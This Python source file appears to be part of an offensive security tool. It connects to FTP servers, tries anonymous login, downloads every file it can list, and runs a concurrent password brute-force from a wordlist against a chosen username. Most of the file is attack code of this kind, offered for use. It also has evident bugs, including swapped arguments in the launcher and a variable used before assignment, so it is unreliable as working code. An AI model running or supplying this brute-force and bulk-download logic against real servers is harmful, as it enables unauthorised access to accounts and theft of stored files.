from ftplib import FTP
import asyncio
import aioftp
from termcolor import colored

def ftp_connect(ip, port, pull=False):
    """
    Connects to the FTP server.

    Parameters:
    - ip (str): The IP address of the FTP server.
    - port (int): The port of the FTP server.

    Returns:
    - socket: The socket object.
    """
    ftp = FTP(ip)
    try : 
        ftp.connect(ip, port)
    except ConnectionError:
        ftp.quit()
        raise ConnectionError("enable to connect to the FTP server")
    
    banner = ftp.getwelcome()
    anon_login = anonymous_ftp_login(ftp, pull)
    
    ftp.quit()
    return banner, anon_login 


def anonymous_ftp_login(ftp, pull):
    """
    Performs anonymous FTP login.

    Parameters:
    - s: The socket object.

    Returns:
    - str: The communication with the FTP server.
    """
    
    result = ftp.login(user="anonymous", passwd="")
    if result == "230 Login successful.":
        try :
            dir_list = ftp.retrlines('LIST')
            if pull:
                pull_files(ftp, pull)
        except ConnectionError:
            ftp.quit()
            raise ConnectionError("not able to list the directory")
        return result
    return "not able to login as anonymous" + result + "\n" + dir_list


def pull_files(ftp, pull):
    """
    Pulls files from the FTP server.

    Parameters:
    - s: The socket object.
    """
    try :
        files = ftp.nlst()
        for file in files:
            file_path = pull + file
            try : 
                with open(file_path, 'wb') as f:
                    ftp.retrbinary('RETR ' + file, f.write)
            except FileNotFoundError:
                ftp.quit()
                raise FileNotFoundError("not able to create the file, or retreive it from the FTP server")
    except ConnectionError:
        ftp.quit()
        raise ConnectionError("not able to pull the files")
    return "Files pulled successfully"


async def ftp_bruteforce(ip, username, password, port, found_flag):
    try:
        async with aioftp.Client.context(ip, user=username, password=password, port=port) as client:
            found_flag.set()
            print(colored(f"[{port}] [ftp] host:{ip}  login:{username}  password:{password}", 'green'))
    except Exception as err:
        print(f"[Attempt] target {ip} - login:{username} - password:{password}")


async def ftp_brute_launch(ip, username, wordlist, port=21):
    tasks = []
    passwords = []
    found_flag = asyncio.Event()
    concurrency_limit = 10
    counter = 0
    with open(wordlist, 'r') as f:
        for password in f.readlines():
            password = password.strip()
            passwords.append(password)

    for password in passwords:
        if counter >= concurrency_limit:
            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
            tasks = []
            counter = 0

        if not found_flag.is_set():

            tasks.append(asyncio.create_task(ftp_bruteforce(ip, username, password, port, found_flag)))
            await asyncio.sleep(1)
            counter += 1

    await asyncio.gather(*tasks)

    if not found_flag.is_set():
        print(colored("\n [-] Failed to find the correct password.", "red"))
        
def launch_ftp_bruteforce(ip, username, wordlist, port=21):
    # need to check for the wordlist file, need to enable list for the ftp server
    asyncio.run(ftp_brute_launch(ip, port, username, wordlist))
    